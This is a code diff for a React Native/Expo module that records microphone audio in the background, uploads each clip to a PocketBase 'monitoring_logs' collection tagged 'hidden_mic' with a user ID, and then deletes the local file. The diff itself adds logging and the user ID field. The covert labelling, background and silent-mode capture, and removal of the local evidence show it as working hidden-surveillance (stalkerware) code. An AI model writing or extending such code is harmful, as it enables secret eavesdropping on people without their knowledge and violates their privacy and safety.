@@ -1,25 +1,29 @@
 import { Audio } from 'expo-av';
 import * as FileSystem from 'expo-file-system';
-import { pb } from '../../services/pocketbase';
+import { pb, getUserId } from '../../services/pocketbase';
 
 let recording: Audio.Recording | null = null;
 
 export const startAudioRecording = async (durationMs: number = 10000) => {
     try {
+        console.log('[AudioMonitor] Requesting permissions...');
         const perm = await Audio.requestPermissionsAsync();
-        if (perm.status !== 'granted') return;
+        if (perm.status !== 'granted') {
+            console.warn('[AudioMonitor] Mic permission denied');
+            return;
+        }
 
         await Audio.setAudioModeAsync({
             allowsRecordingIOS: true,
             playsInSilentModeIOS: true,
-            staysActiveInBackground: true, // Key for Android background recording
+            staysActiveInBackground: true,
         });
 
         const { recording: newRecording } = await Audio.Recording.createAsync(
             Audio.RecordingOptionsPresets.HIGH_QUALITY
         );
         recording = newRecording;
-        console.log('Recording started');
+        console.log('[AudioMonitor] Recording started for', durationMs, 'ms');
 
         // Automatically stop after duration
         setTimeout(async () => {
@@ -27,7 +31,7 @@ export const startAudioRecording = async (durationMs: number = 10000) => {
         }, durationMs);
 
     } catch (err) {
-        console.error('Failed to start recording', err);
+        console.error('[AudioMonitor] Failed to start recording:', err);
     }
 };
 
@@ -35,7 +39,7 @@ export const stopAudioRecording = async () => {
     if (!recording) return;
 
     try {
-        console.log('Stopping recording..');
+        console.log('[AudioMonitor] Stopping recording...');
         await recording.stopAndUnloadAsync();
         const uri = recording.getURI();
         recording = null;
@@ -44,28 +48,28 @@ export const stopAudioRecording = async () => {
             await uploadAudio(uri);
         }
     } catch (err) {
-        console.error('Failed to stop recording', err);
+        console.error('[AudioMonitor] Failed to stop recording:', err);
     }
 };
 
 const uploadAudio = async (uri: string) => {
     try {
         const formData = new FormData();
-        // @ts-ignore
+        // @ts-ignore — React Native FormData accepts {uri, name, type}
         formData.append('file', {
             uri,
             name: `audio_${Date.now()}.m4a`,
             type: 'audio/m4a',
         });
         formData.append('type', 'hidden_mic');
+        formData.append('user_id', getUserId());
 
-        // Ensure 'monitoring_logs' collection exists in PocketBase
         await pb.collection('monitoring_logs').create(formData);
-        console.log('Audio uploaded successfully');
+        console.log('[AudioMonitor] Audio uploaded successfully');
 
         // Cleanup local file
         await FileSystem.deleteAsync(uri);
     } catch (err) {
-        console.error('Upload failed', err);
+        console.error('[AudioMonitor] Upload failed:', err);
     }
 };
